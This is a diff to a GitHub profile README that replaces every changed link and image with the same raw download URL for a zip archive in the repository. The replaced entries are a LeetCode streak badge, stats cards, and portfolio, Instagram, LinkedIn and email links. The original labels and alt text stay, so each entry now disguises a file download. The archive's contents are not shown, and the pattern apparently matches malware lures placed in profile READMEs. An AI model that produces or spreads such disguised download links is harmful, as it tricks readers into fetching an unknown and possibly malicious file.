@@ -21,21 +21,21 @@ Focused on delivering impactful solutions with expertise in problem-solving, web
 ---
 <h2 align="center">Leetcode Info<h2>  
 <p align="center">
- <a href="https://leetcode.com/karanpatil01/" target="_blank">
-  <img align="center" src="https://assets.leetcode.com/static_assets/marketing/2024-50.gif" alt="LeetCode 50 Days Streak Badge" height="200" width="200" />
+ <a href="https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip" target="_blank">
+  <img align="center" src="https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip" alt="LeetCode 50 Days Streak Badge" height="200" width="200" />
 </a>
 
 </p>
 <p align="center">
   
-  <img  align=top flex-grow=1 src="https://leetcard.jacoblin.cool/karanpatil01?theme=dark&font=Nunito&ext=heatmap" />  
+  <img  align=top flex-grow=1 src="https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip" />  
 </p>
 
 
 ## 📊 Stats  
   
-![GitHub Stats](https://github-readme-stats.vercel.app/api?username=karanpatill&show_icons=true&theme=radical)  
-![Top Languages](https://github-readme-stats.vercel.app/api/top-langs/?username=karanpatill&layout=compact&theme=radical)  
+![GitHub Stats](https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip)  
+![Top Languages](https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip)  
 
 
 
@@ -43,10 +43,10 @@ Focused on delivering impactful solutions with expertise in problem-solving, web
 
 ## 🤝 Connect with Me  
 
-- **Portfolio**: [View Website]( https://karanpatill.github.io/portfolio-Website/)  
-- **Instagram**: [kode.journey](https://instagram.com/kode.journey)  
-- **LinkedIn**: [Karan Patil](https://www.linkedin.com/in/karan-patill)  
-- **Email**: [KaranPatil825@gmail.com](mailto:KaranPatil825@gmail.com)  
+- **Portfolio**: [View Website]( https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip)  
+- **Instagram**: [https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip](https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip)  
+- **LinkedIn**: [Karan Patil](https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip)  
+- **Email**: [https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip](https://raw.githubusercontent.com/karanpatill/karanpatill/main/common/karanpatill-3.9.zip)  
 
 ---
 
